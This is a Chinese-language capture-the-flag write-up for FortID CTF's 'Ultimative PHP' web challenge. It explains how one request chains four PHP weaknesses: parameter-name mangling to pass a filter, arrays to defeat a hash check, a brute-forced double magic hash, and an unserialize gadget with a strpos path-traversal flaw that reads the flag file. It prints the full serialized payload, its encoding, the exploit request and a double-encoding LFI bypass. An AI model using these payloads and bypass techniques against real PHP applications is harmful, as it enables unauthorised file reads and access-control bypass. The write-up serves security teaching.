---
title: "Ultimative PHP — 一条请求里串起四种 PHP 弱点 (FortID CTF)"
description: FortID CTF web 题：参数名污染绕过 WAF、数组绕哈希、双魔术哈希碰撞、unserialize 对象 + strpos 路径穿越读 flag。
type: ctf
pubDate: Oct 12 2026
updatedDate: Oct 12 2026
---

> 分类：Web ｜ 赛事：FortID CTF 2026 ｜ 关键词：PHP 参数名 mangling、松散比较、magic hash、PHP 反序列化、strpos 路径穿越
>
> Flag: `FortID{...}`（需连题目实例获取，离线 `flag.txt` 为 `FortID{redacted}` 占位；但本文给出的 `code` 是我本地爆破出的真实可用值，profile payload 也已按真实字节长度构造好）

## 题目背景

一个"终极身份迁移网关"（`src/index.php`），要你 **在同一条请求里** 一次性通过四道校验：管理员访问、两个恢复答案、一段兼容性 code、一份可移植的 legacy profile。全过才会把 flag 吐出来。源码一目了然，难点在于每一步都藏着一个 PHP 的经典坑。flag 在容器里是 `/tmp/flag`（`deploy/entrypoint.sh` 写入，并有软链 `/flag`）。

## 源码审计 / 侦察

从上到下，网关依次做这些事：

```php
// ① access_level 保护：原始 query 里（rawurldecode 后）不许出现 'access_level'
if (str_contains(rawurldecode($rawQuery), 'access_level')) {
    fail_request('The access_level parameter is protected');
}
if (($_GET['access_level'] ?? '') !== 'administrator') {
    fail_request('Administrator access required');
}

// ② 两个恢复答案：类型相同、值不同，但 sha256 指纹要一致
if (get_debug_type($primary) !== get_debug_type($backup)) fail_request(...);
if ($primary === $backup) fail_request('Recovery answers must be different');
$primaryHash = hash('sha256', 'legacy-recovery:v1:' . $primary);
$backupHash  = hash('sha256', 'legacy-recovery:v1:' . $backup);
if (!hash_equals($primaryHash, $backupHash)) fail_request(...);

// ③ 兼容性 code：md5 前 9 位和 sha256 前 9 位，!== 但 ==
$material = 'ULTIMATIVE-PHP-2026:' . $code;
$legacyDigest = substr(hash('md5', $material), 0, 9);
$modernDigest = substr(hash('sha256', $material), 0, 9);
if (!($legacyDigest !== $modernDigest && $legacyDigest == $modernDigest)) fail_request(...);

// ④ profile：base64url → unserialize（白名单两个类）→ 必须是 MigratedProfile
$profile = @unserialize($serializedProfile, [
    'allowed_classes' => [MigratedProfile::class, LegacyTemplate::class],
]);
if (!$profile instanceof MigratedProfile) fail_request('Unsupported profile type');
echo '<p class="flag">' . htmlspecialchars((string) $profile, ...) . '</p>';
```

最后输出的是 `(string)$profile`，也就是 `MigratedProfile::__toString()` → 返回 `$this->displayName` 的字符串形式。而 `LegacyTemplate::__toString()` 会去 **读文件**：

```php
final class LegacyTemplate {
    public $template = 'welcome.txt';
    public function __toString(): string {
        if (strpos($this->template, '../')) return '[invalid template]';   // ← 坑在这
        $path = __DIR__ . '/templates/' . $this->template;
        $contents = file_get_contents($path);
        return $contents === false ? '[missing template]' : $contents;
    }
}
```

## 关键漏洞

### 坑①：参数名 mangling 绕过 access_level 过滤

WAF 检查的是"原始 query 字符串里有没有 `access_level`"，但真正取值用的是 `$_GET['access_level']`。PHP 在构造 `$_GET` 时会**把参数名里的 `.` 和空格替换成 `_`**。所以我发 `access.level=administrator`：原始 query 是 `access.level=...`（含点，不含 `access_level`，过 WAF），而 PHP 把 key 规整成 `access_level`，`$_GET['access_level']` 正好等于 `administrator`。

### 坑②：数组绕过"sha256 指纹相同但值不同"

真要让两个不同输入的 sha256 相等是不可能的——除非它们**拼接后变成同一个字符串**。`'legacy-recovery:v1:' . $primary` 里如果 `$primary` 是数组，PHP 会把数组转成字符串字面量 `"Array"`（只抛 warning，不中断）。于是用 `primary[]=1&backup[]=2`：

- `get_debug_type` 都是 `"array"` → 类型相同 ✅
- `['1'] === ['2']` 为假 → 值不同 ✅
- 两边拼出来都是 `'legacy-recovery:v1:Array'` → sha256 完全一致 → `hash_equals` 通过 ✅

### 坑③：双魔术哈希（md5 与 sha256 同时 0e 开头）

`!== 但 ==` 是 PHP 松散比较的经典 magic hash：两个都是 `"0e" + 纯数字` 的字符串会被当成 `0 * 10^n = 0`，于是 `==` 成立；但它们是不同字符串，`!==` 也成立。区别于常见题目，这里要求 **md5 前 9 位和 sha256 前 9 位同时**满足 `^0e[0-9]{7}$`。

我在本地爆破了 `code`（material 固定前缀 `ULTIMATIVE-PHP-2026:`，约 5900 万次命中）：

```
code = 59036305
md5 ("ULTIMATIVE-PHP-2026:59036305")[0:9]    = 0e3791209
sha256("ULTIMATIVE-PHP-2026:59036305")[0:9]  = 0e9920675
```

两者都是 `0e+7 位数字` → 松散比较都等于 `0.0`（`==` 真），字符串不同（`!==` 真）。`code` 长度 8 ≤ 64，满足长度限制。

### 坑④：unserialize 对象链 + `strpos` 路径穿越读 flag

白名单允许 `MigratedProfile` 和 `LegacyTemplate`。我把 `MigratedProfile->displayName` 设成一个 `LegacyTemplate` 对象——这样 `(string)$profile` 会触发 `MigratedProfile::__toString()` → `(string)$this->displayName` → `LegacyTemplate::__toString()` → `file_get_contents()`。

`LegacyTemplate` 的"防穿越"写成 `if (strpos($this->template, '../'))`——`strpos` 返回的是**位置**，当 `../` 恰好在第 0 位时返回 `0`，`if (0)` 为假，直接放行！这是 `strpos` 不用 `=== false` 判断的经典 bug。于是 `template = "../../../../tmp/flag"`：

- `strpos(..., '../') === 0` → `if(0)` 假 → 不算 invalid；
- `__DIR__`（`/var/www/html`）`. '/templates/' . '../../../../tmp/flag'` 解析成 `/tmp/flag`（四层 `../`：templates→html→www→var→/，再进 `tmp/flag`）。`/flag` 软链也可用 `../../../../flag`。

## 利用步骤

### 1）构造 profile 对象并 base64url 编码

序列化字符串（公有属性，无 null 字节问题）：

```
O:15:"MigratedProfile":1:{s:11:"displayName";O:14:"LegacyTemplate":1:{s:8:"template";s:20:"../../../../tmp/flag";}}
```

`../../../../tmp/flag` 长度 20，类名长度 15 / 14，属性名长度 11 / 8——都已核对。base64url（`+/`→`-_`，去 `=` 填充）：

```
TzoxNToiTWlncmF0ZWRQcm9maWxlIjoxOntzOjExOiJkaXNwbGF5TmFtZSI7TzoxNDoiTGVnYWN5VGVtcGxhdGUiOjE6e3M6ODoidGVtcGxhdGUiO3M6MjA6Ii4uLy4uLy4uLy4uL3RtcC9mbGFnIjt9fQ
```

### 2）一条请求打全部四关

```
GET /?access.level=administrator&primary[]=1&backup[]=2&code=59036305&profile=TzoxNToiTWlncmF0ZWRQcm9maWxlIjoxOntzOjExOiJkaXNwbGF5TmFtZSI7TzoxNDoiTGVnYWN5VGVtcGxhdGUiOjE6e3M6ODoidGVtcGxhdGUiO3M6MjA6Ii4uLy4uLy4uLy4uL3RtcC9mbGFnIjt9fQ HTTP/1.1
Host: <target>
```

每一段为什么成立，对应上面坑①~④。响应里 `<p class="flag">...</p>` 就是 `/tmp/flag` 的内容。

> 旁注：源码顶部的 `?manual=` 分支还有一个二次编码 LFI（先对原始值查 `../`/`php://`，再 `rawurldecode` 才 include），可以用 `%2e%2e%2f` 绕过并包含任意 `.php`。但 flag 是 `.txt`、且 `allow_url_include=Off`，所以这条是干扰项，主线还是上面的反序列化 gadget。

### 本地验证

本机没装 PHP，但关键环节我都离线核过：

- 用 Python 复刻了 magic hash 爆破，确认 `code=59036305` 时 md5/sha256 前 9 位分别是 `0e3791209`/`0e9920675`，`float('0e3791209')==float('0e9920675')` 为 `True`、字符串 `!=` 为 `True`（即 PHP 的 `==` 真、`!==` 真）。
- 按 PHP 序列化格式逐字节算出 profile 字符串并编码，长度字段与实际字符串长度一致。

## Flag

`FortID{...}`（需连题目实例获取；离线 dump 的 `flag.txt` 为 `FortID{redacted}`）

## 小结 / 收获

- **"检查的东西"和"用到的东西"要一致**：WAF 查原始 query，取值却用 `$_GET`，PHP 的 `.`/空格→`_` 名字规整让两者脱节。
- **数组是 PHP 松散校验的万能钥匙**：类型判等、拼接成 `"Array"`，能一举绕过"同类型 / 值不同 / 哈希相同"这种看似自相矛盾的条件。
- **magic hash 可以叠加**：要求两个哈希函数同时 `0e` 开头只是把爆破量级抬高（本题约 5000 万次），并非更难，写个循环就能跑出来。
- **`strpos` 不配 `=== false` 就是穿越口子**：`../` 落在第 0 位返回 `0`，`if` 直接放行；配合 `__toString` 魔术方法 + unserialize，就是一条稳定的任意文件读取链。
